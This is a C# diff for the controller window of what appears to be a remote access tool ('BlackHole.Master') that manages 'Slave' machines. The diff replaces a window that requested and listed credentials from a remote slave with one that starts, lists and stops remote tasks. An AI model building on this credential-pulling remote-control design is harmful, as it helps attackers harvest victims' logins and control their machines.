@@ -1,4 +1,5 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
 using System.Linq;
 using System.Windows;
 using System.Windows.Media.Imaging;
@@ -11,28 +12,24 @@ namespace BlackHole.Master
     /// <summary>
     /// 
     /// </summary>
-    public partial class CredentialsWindow : SlaveWindow
+    public partial class TasksWindow : SlaveWindow
     {
-        public CredentialsWindow()
+        public TasksWindow()
         {
             InitializeComponent();
+            Send(new StartTasksMessage());
         }
 
         /// <summary>
         /// 
         /// </summary>
         /// <param name="slave"></param>
-        public CredentialsWindow(Slave slave)
+        public TasksWindow(Slave slave)
             : base(slave)
         {
             InitializeComponent();
+            Send(new StartTasksMessage());
         }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private void GetCredentials(object sender, RoutedEventArgs routedEventArgs) => 
-            Send(new StartCredentialsMessage());
 
         /// <summary>
         /// 
@@ -48,14 +45,20 @@ namespace BlackHole.Master
                     case SlaveEventType.IncommingMessage:
                     {
                         ev.Data.Match()
-                            .With<CredentialsMessage>(message =>
+                            .With<TasksMessage>(message =>
                             {
-                                CredentialsList.ItemsSource = message.Credentials.Select(c => c.Dictionary).ToArray();
+                                TasksList.ItemsSource = message.Tasks.Select(c => c.Dictionary).ToArray();
                             });
                         break;
                     }
                 }
             });
+        }
+
+        protected override void OnClosed(EventArgs e)
+        {
+            Send(new StopTasksMessage());
+            base.OnClosed(e);
         }
     }
 }
